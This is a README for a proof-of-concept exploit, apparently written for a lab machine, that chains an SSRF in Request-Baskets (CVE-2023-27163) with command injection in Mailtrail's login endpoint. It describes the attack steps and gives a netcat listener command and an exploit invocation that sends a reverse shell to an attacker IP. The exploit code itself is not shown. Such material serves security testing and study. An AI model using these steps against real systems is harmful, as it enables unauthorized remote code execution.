#  SSRF to RCE Exploit – Mailtrail via Request-Baskets (CVE-2023-27163)

This PoC chains an SSRF vulnerability in **Request-Baskets ≤ 1.2.1** with a command injection in **Mailtrail**'s `/login` endpoint to achieve **remote code execution**.

##  Exploit Logic

1. Create a malicious **basket** (proxy) pointing to `http://127.0.0.1:80`.
2. Forward a crafted POST request to `/login` with a command injection payload.
3. Gain a **reverse shell** from Mailtrail running locally on the vulnerable server.

##  Usage

Start a listener:

```bash
nc -lvnp 8000
````

Run the exploit:

```bash
python3 exploit_ssrf_to_rce_sau.py <ATTACKER_IP> <ATTACKER_PORT> <VICTIME's_BASKETS_URL>
```

Example:

```bash
python3 exploit_ssrf_to_rce_sau.py 10.10.10.10 8000 http://machine-ip:port/
```

## ⚠️ Disclaimer

This code is for educational purposes only. Do not use it on systems you do not own or have explicit permission to test.

